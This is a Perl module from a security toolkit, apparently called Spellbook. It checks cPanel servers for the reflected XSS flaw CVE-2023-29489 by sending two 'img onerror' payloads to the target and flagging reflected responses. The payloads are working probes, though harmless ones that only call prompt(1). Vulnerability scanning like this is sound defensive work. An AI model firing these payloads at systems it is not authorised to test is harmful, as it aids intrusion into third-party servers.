package Spellbook::Advisory::CVE_2023_29489 {
    use strict;
    use warnings;
    use URI;
    use Spellbook::Core::UserAgent;
    use Readonly;

    our $VERSION = '0.0.2';

    Readonly my $HTTP_BAD_REQUEST => 400;
    Readonly my $CPANEL_PORT      => 2083;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $port, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'     => \$help,
            't|target=s' => \$target,
            'p|port=i'   => \$port
        );

        if ($target) {
            if ($target !~ /^https?:\/\//xsm) {
                $target = "https://$target";
            }

            my $has_port = 0;

            if ($target =~ m{^https?://[^/:]+:\d+}xsm) {
                $has_port = 1;
            }

            my $uri = URI -> new($target);

            if ($port) {
                $uri -> port($port);
            }

            if (!$port && !$has_port) {
                $uri -> port($CPANEL_PORT);
            }

            $target = $uri -> as_string;

            if ($target =~ /\/$/xsm) {
                chop $target;
            }

            my $marker = '<img src=x onerror=';
            my $user_agent = Spellbook::Core::UserAgent -> new();

            my @payloads = (
                q{cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa},
                q{<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa}
            );

            foreach my $payload (@payloads) {
                my $request = $user_agent -> get("$target/$payload");

                if ($request -> code() == $HTTP_BAD_REQUEST && index($request -> content(), $marker) >= 0) {
                    push @result, "$target/$payload";
                }
            }

            return @result;
        }

        if ($help) {
            return "\n"
                . "                \rAdvisory::CVE_2023_29489\n"
                . "                \r========================\n"
                . "                \r-h, --help     See this menu\n"
                . "                \r-t, --target   Define a target\n"
                . "                \r-p, --port     cPanel service port (default: 2083)\n\n";
        }

        return 0;
    }
}

1;
